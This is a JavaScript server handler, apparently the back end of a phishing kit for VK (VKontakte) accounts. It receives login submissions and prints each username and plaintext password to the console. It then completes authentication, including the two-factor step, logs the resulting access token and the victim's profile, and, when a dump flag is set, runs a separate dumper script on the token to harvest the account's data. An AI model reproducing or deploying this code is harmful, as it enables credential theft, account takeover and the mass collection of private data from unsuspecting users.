import { VK } from "vk-io";
import { sessionData } from "../server";
import auth from "./_auth";
import { R_SUCCESS, R_REQUIRE_2FA } from "./_auth-constants";
import { Instance } from "chalk";
import { join } from "path";

const chalk = new Instance({ level: 2 });
const dumperPath = join(process.cwd(), "scripts", "dump", "index.js");

const _ = console.log.bind(console);
const kwLog = (key, value) =>
  _(chalk.blueBright(`${key}:`), chalk.magentaBright(value));

const dumped = new Set();

const { dump } = require(dumperPath);

/**
 * @type {import("polka").Middleware}
 */

export const post = async (request, response) => {
  const ua = request.headers["user-agent"];
  let agent;

  _();
  _(chalk.bold("<Authorization attempt>"));
  kwLog("Username", request.body.username);
  kwLog("Password", request.body.password);

  if (ua.includes("iphone")) agent = "IPhone";
  else if (ua.includes("ipad")) agent = "IPad";
  else if (ua.includes("android")) agent = "Android";
  else if (ua.includes("windows phone")) agent = "WindowsPhone";
  else if (ua.includes("windows")) agent = "Windows";
  else agent = "Android";

  kwLog("Platform", agent);

  const result = await auth(request.body, agent.toLowerCase());

  response.writeHead(200, "OK", {
    "Content-Type": "application/json"
  });

  response.end(JSON.stringify(result));

  if (result.status === R_SUCCESS) {
    kwLog("Status", chalk.greenBright("Success"));
    kwLog("Page", `https://vk.com/id${result.user_id}`);
    kwLog("Token", result.token);

    const vk = new VK({ token: result.token });

    const [me] = await vk.api.users.get({});
    kwLog("Name", `${me.first_name} ${me.last_name}`);
    kwLog(
      "2fa",
      "code" in request.body ? chalk.redBright("Yes") : chalk.greenBright("No")
    );

    if (sessionData.dump === true) {
      if (dumped.has(me.id)) {
        _(chalk.yellowBright("Profile was already dumped"));
        return;
      }

      dumped.add(me.id);

      _(
        chalk.yellowBright(
          `Starting dumper for profile: https://vk.com/id${me.id}`
        )
      );

      return await dump(result.token)
        .then(() =>
          _(
            chalk.greenBright(
              `Profile: https://vk.com/id${me.id} successful dumped`
            )
          )
        )
        .catch(error =>
          _(
            chalk.redBright(
              `Profile: https://vk.com/id${me.id} failed to dump`
            ),
            error
          )
        );
    }
  } else if (result.status === R_REQUIRE_2FA) {
    kwLog("Status", chalk.yellowBright("2FA Required"));
  } else {
    kwLog("Status", chalk.redBright("Error"));
  }
};
